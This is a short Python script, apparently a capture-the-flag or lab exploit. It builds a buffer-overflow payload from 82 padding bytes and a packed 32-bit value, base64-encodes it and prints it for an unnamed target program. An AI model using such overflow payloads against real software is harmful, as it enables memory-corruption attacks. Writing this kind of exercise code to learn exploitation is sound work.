
import sys
import struct
import base64

buf = b'zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz'
buf += struct.pack('<I', 311126279)
buf = base64.b64encode(buf)
buf += b'\n'

sys.stdout.buffer.write(buf)
